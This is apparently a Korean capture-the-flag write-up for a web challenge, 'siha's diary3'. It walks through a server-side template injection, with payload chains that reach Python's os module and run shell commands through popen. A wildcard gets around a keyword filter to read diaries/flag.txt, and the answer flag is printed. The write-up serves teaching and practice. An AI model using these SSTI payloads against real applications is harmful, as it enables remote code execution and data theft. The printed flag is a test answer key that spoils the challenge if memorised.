# siha's diary3

> author: 최경재(siha) / difficulty: medium / points: 400

## Description

siha가 지난 사이트의 취약점을 패치했다고 한다, 그런데... 여전한 것 같은데?

## Hint
- SSTI로는 생각보다 많은 일을 할 수 있다! diaries/flag.txt의 내용을 열어보려면 어떻게 해야 할까? (50)
- os.system() 또는 os.popen() 함수를 실행하는 게 최종적인 목표다! (100)

## Write up

주석 처리된 코드를 살펴보면 flag.txt 파일이 일기중에 존재한다는 것을 알 수 있는데,
flag 문자열이 필터링되어 바로 열어볼 수가 없다.

search 파라미터에 {{ 1+1 }}을 넣어보면 2가 출력되는 것을 확인할 수 있다.
이는 Server side template injection이 가능함을 뜻한다. (siha's diary2와 동일)

'3.5.2 (default, Nov 17 2016, 17:05:23) \n[GCC 5.4.0 20160609]' 위 버전을 기준으로, 페이로드는

```
{{ ().__class__.__base__.__subclasses__()[391] }}
>>> <class 'warnings.catch_warnings'>

{{ ().__class__.__base__.__subclasses__()[391].__init__.__globals__['sys'] }}
>>> <module 'sys' (built-in)>

{{ ().__class__.__base__.__subclasses__()[391].__init__.__globals__['sys'].modules['os'] }}
>>> <module 'os' from '~/lib/python3.5/os.py'> 

{{ ().__class__.__base__.__subclasses__()[391].__init__.__globals__['sys'].modules['os'] }}
>>> <module 'os' from '~/lib/python3.5/os.py'> 

{{ ().__class__.__base__.__subclasses__()[391].__init__.__globals__['sys'].modules['os'].popen('ls diaries').read() }}
>>> flag.txt myforthwebsite.txt phrase1.txt phrase2.txt poem.txt poem2.txt

{{ ().__class__.__base__.__subclasses__()[391].__init__.__globals__['sys'].modules['os'].popen('ls diaries').read() }}
>>> flag.txt myforthwebsite.txt phrase1.txt phrase2.txt poem.txt poem2.txt

{{ ().__class__.__base__.__subclasses__()[391].__init__.__globals__['sys'].modules['os'].popen('cat diaries/flag.txt').read() }}
>>> GO AWAY HACKER!

{{ ().__class__.__base__.__subclasses__()[391].__init__.__globals__['sys'].modules['os'].popen('cat diaries/f*.txt').read() }}
>>> GuardianCTF{73mpl473_1nj3c710n_15_4m4z1n6}

```



## How to run

```
pip install -r requirements.txt
python app.py
```

## flag

GuardianCTF{73mpl473_1nj3c710n_15_4m4z1n6}